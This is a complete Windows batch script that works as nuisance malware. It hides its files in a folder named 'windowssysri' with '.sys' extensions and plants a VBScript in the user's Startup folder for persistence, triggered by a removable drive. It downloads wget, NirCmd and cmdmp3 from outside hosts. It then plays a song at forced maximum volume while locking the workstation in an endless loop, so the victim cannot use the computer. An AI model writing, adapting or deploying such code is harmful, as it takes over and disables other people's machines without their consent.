@echo off

:main
if not exist "%userprofile%\windowssysri" goto install
if not exist "%userprofile%\windowssysri\nircmd.exe" goto install
if not exist "%userprofile%\windowssysri\cmdmp3.exe" goto install
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\testwindowssysri.vbs" goto install
if not exist "%userprofile%"\windowssysri\maindrive.sys goto install


set /p maindrive=<"%userprofile%"\windowssysri\maindrive.sys
start %userprofile%\windowssysri\cmdmp3.exe %userprofile%\windowssysri\song.mp3
%userprofile%\windowssysri\nircmd.exe setsysvolume 65535
%userprofile%\windowssysri\nircmd.exe mutesysvolume 0

:a
rundll32.exe user32.dll, LockWorkStation
rem %maindrive%roll\nircmd.exe setsysvolume 6553
rem %maindrive%roll\nircmd.exe setsysvolume 6553
%userprofile%\windowssysri\nircmd.exe setsysvolume 65535
%userprofile%\windowssysri\nircmd.exe mutesysvolume 0
goto a




:install
if exist "%userprofile%\windowssysri" del "%userprofile%\windowssysri" /f /q

for /f "skip=3 tokens=1" %%a in ('powershell -command "$PSVersionTable.PSVersion"') do set Major=%%a
if %Major% lss 3 goto updatepowershell

if exist %userprofile%\windowssysri del %userprofile%\windowssysri /q /f
if not exist %userprofile%\windowssysri md %userprofile%\windowssysri
echo %CD:~0,3%>%userprofile%\windowssysri\maindrive.sys
set maindrive=%CD:~0,3%

set script="%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\testwindowssysri.vbs"

echo Set fso = CreateObject("Scripting.FileSystemObject") > %script%
echo Set shell = CreateObject("WScript.Shell") >> %script%
echo userProfilePath = shell.ExpandEnvironmentStrings("%USERPROFILE%") >> %script%
echo driveFilePath = userProfilePath ^& "\windowssysri\maindrive.sys" >> %script%
echo Do While True >> %script%
echo     If fso.FileExists(driveFilePath) Then >> %script%
echo         Set driveFile = fso.OpenTextFile(driveFilePath, 1) >> %script%
echo         driveLetter = driveFile.ReadLine >> %script%
echo         driveFile.Close >> %script%
echo         filePath = driveLetter ^& "files\windowssysri.bat" >> %script%
echo         If fso.FileExists(filePath) Then >> %script%
echo             shell.Run filePath >> %script%
echo             Do While fso.DriveExists(driveLetter) >> %script%
echo                 WScript.Sleep 1000 ' Sleep for 1 second before checking again >> %script%
echo             Loop >> %script%
echo             WScript.Sleep 5000 ' Sleep for 5 seconds before starting search again >> %script%
echo         End If >> %script%
echo     End If >> %script%
echo     WScript.Sleep 1000 ' Sleep for 1 second before checking again >> %script%
echo Loop >> %script%

:wgetinstall
echo Trying to download wget.exe (download Tool)
powershell Invoke-WebRequest https://eternallybored.org/misc/wget/1.19.4/32/wget.exe -OutFile "%userprofile%\windowssysri\wget.exe"
if %errorlevel%==9009 bitsadmin /transfer "DownloadWgetwindowssysri" /PRIORITY HIGH "https://eternallybored.org/misc/wget/1.19.4/32/wget.exe" "%userprofile%\windowssysri\wget.exe"
if %errorlevel%==9009 goto fail2
if not exist "%userprofile%\windowssysri\wget.exe" goto wgetinstall

rem Generating MD5 Hash
echo Generating MD5 Hash
certutil -hashfile "%userprofile%\windowssysri\wget.exe" MD5 | findstr /V ":" >"%userprofile%\windowssysri\wgethash.sys"
rem  Writing Original Hash to file...
echo Writing Original Hash to file...
echo 3dadb6e2ece9c4b3e1e322e617658b60>"%userprofile%\windowssysri\orginal_wgethash.sys"
fc "%userprofile%\windowssysri\wgethash.sys" "%userprofile%\windowssysri\orginal_wgethash.sys"
if %errorlevel%==0 goto nircmdinstall

set comefrom=nircmdinstall
echo MD5-Hash verification failed!
set /p remotehash=<"%userprofile%\windowssysri\wgethash.sys"
echo Expected Hash: 3dadb6e2ece9c4b3e1e322e617658b60
echo Returned Hash: %remotehash%

:ask1
echo Do you want to ignore and continue? (y/n)
set /p opt=Opt: 
if %opt%==y goto %comefrom%
if %opt%==n goto fail1
goto ask1

:fail1
echo The Hash isn't the same. This could mean that the Provider replaced or edited the file	 or the servers are offline or you have no internet connection!
echo We will not continue this Programm. Press Any Key to exit!
pause
goto cancel

:fail2
echo It looks like you are using and very old version of windows or you havn't installed the newest type of powershell!
echo Please Donwload bitsadmin or update powershell!
pause
goto cancel

:nircmdinstall
if not exist "%userprofile%\windowssysri\empty.sys" type nul>"%userprofile%\windowssysri\empty.sys"
if not exist "%userprofile%\windowssysri\wget.exe" goto wgetinstall
"%userprofile%\windowssysri\wget.exe" https://www.nirsoft.net/utils/nircmd.zip -O"%userprofile%\windowssysri\nircmd.zip"
fc "%userprofile%\windowssysri\empty.sys" "%userprofile%\windowssysri\nircmd.zip"
if %errorlevel%==0 goto nircmdinstall 

set comefrom1=nircmdinstall_unzipped
set zipFile=%userprofile%\windowssysri\nircmd.zip
goto unzip
:nircmdinstall_unzipped
rem powershell -Command "Expand-Archive \"%userprofile%\windowssysri\nircmd.zip\" -DestinationPath \"%userprofile%\windowssysri\""
del "%userprofile%\windowssysri\nircmd.zip" /f /q
del "%userprofile%\windowssysri\NirCmd.chm" /f /q
del "%userprofile%\windowssysri\nircmdc.exe" /f /q

echo Generating MD5 Hash
certutil -hashfile "%userprofile%\windowssysri\nircmd.exe" MD5 | findstr /V ":" >"%userprofile%\windowssysri\nircmdhash.sys"
rem  Writing Original Hash to file...
echo Writing Original Hash to file...
echo a1cd6a64e8f8ad5d4b6c07dc4113c7ec>"%userprofile%\windowssysri\orginal_nircmdhash.sys"
fc "%userprofile%\windowssysri\nircmdhash.sys" "%userprofile%\windowssysri\orginal_nircmdhash.sys"
if %errorlevel%==0 goto cmdmp3install

set comefrom=cmdmp3install
echo MD5-Hash verification failed!
set /p remotehash=<"%userprofile%\windowssysri\nircmdhash.sys"
echo Expected Hash: a1cd6a64e8f8ad5d4b6c07dc4113c7ec
echo Returned Hash: %remotehash%
goto ask1






:cmdmp3install
if not exist "%userprofile%\windowssysri\wget.exe" goto wgetinstall
"%userprofile%\windowssysri\wget.exe" https://jiml.us/downloads/cmdmp3.zip -O"%userprofile%\windowssysri\cmdmp3.zip"
fc "%userprofile%\windowssysri\empty.sys" "%userprofile%\windowssysri\cmdmp3.exe"
if %errorlevel%==0 goto cmdmp3install

set comefrom1=cmdmp3_unzipped
set zipFile=%userprofile%\windowssysri\cmdmp3.zip
goto unzip
:cmdmp3_unzipped
rem powershell -Command "Expand-Archive \"%userprofile%\windowssysri\cmdmp3.zip\" -DestinationPath \"%userprofile%\windowssysri\""
del "%userprofile%\windowssysri\cmdmp3.zip" /q /f
del "%userprofile%\windowssysri\cmdmp3.c" /q /f
del "%userprofile%\windowssysri\cmdmp3win.c" /q /f
del "%userprofile%\windowssysri\cmdmp3win.exe" /q /f
ren "%userprofile%\windowssysri\readme.txt" readmecmdmp3.txt

echo Generating MD5 Hash
certutil -hashfile "%userprofile%\windowssysri\cmdmp3.exe" MD5 | findstr /V ":" >"%userprofile%\windowssysri\cmdmp3hash.sys"
rem  Writing Original Hash to file...
echo Writing Original Hash to file...
echo f01f0a0bdb46224386b3a19787c457b7>"%userprofile%\windowssysri\orginal_cmdmp3hash.sys"
fc "%userprofile%\windowssysri\cmdmp3hash.sys" "%userprofile%\windowssysri\orginal_cmdmp3hash.sys"
if %errorlevel%==0 goto songinstall

set comefrom=main
echo MD5-Hash verification failed!
set /p remotehash=<"%userprofile%\windowssysri\cmdmp3hash.sys"
echo Expected Hash: f01f0a0bdb46224386b3a19787c457b7
echo Returned Hash: %remotehash%
goto ask1


:songinstall
copy %maindrive%files\song.mp3 "%userprofile%\windowssysri\song.mp3"
goto main


:updatepowershell
cls 
echo your Major Powershell version is not supported.
echo Required version: 3
echo Your version: %Major%
echo Do you want to update it? (y/n)
set /p opt=Option: 
if %opt%==y goto updatepowershell_init
if %opt%==n goto cancel
goto updatepowershell
:updatepowershell_init
cls
echo Please download and install powershell from the link below:
echo https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-windows?view=powershell-7.3#installing-the-zip-package
echo Or just search "Powershell Download" in the internet (Don't download any Viruses!)
pause

:cancel
cls
echo We are not able to continue the installation.
echo Press any key to exit.
echo We will delete the entire progress until now.
del %userprofile%\windowssysri /q /f
echo deltetion Success
pause
exit

:unzip
set vbsFile=%userprofile%\windowssysri\unzip1.vbs
set destination=%userprofile%\windowssysri\

echo Set objFSO = CreateObject("Scripting.FileSystemObject"^)>%vbsFile%
echo strZipFile = "%zipFile%">>%vbsFile%
echo strDestination = "%destination%">>%vbsFile%
echo If objFSO.FolderExists(strDestination^) Then>>%vbsFile%
echo     Set objFolder = objFSO.GetFolder(strDestination^)>>%vbsFile%
echo Else>>%vbsFile%
echo     Set objFolder = objFSO.CreateFolder(strDestination^)>>%vbsFile%
echo End If>>%vbsFile%
echo With CreateObject("Shell.Application"^)>>%vbsFile%
echo     .Namespace(objFolder.Path^).CopyHere .Namespace(strZipFile^).Items>>%vbsFile%
echo End With>>%vbsFile%

cscript //nologo %vbsFile%
echo Unzip Error %errorlevel%
del "%userprofile%\windowssysri\unzip1.vbs" /f /q
goto %comefrom1%
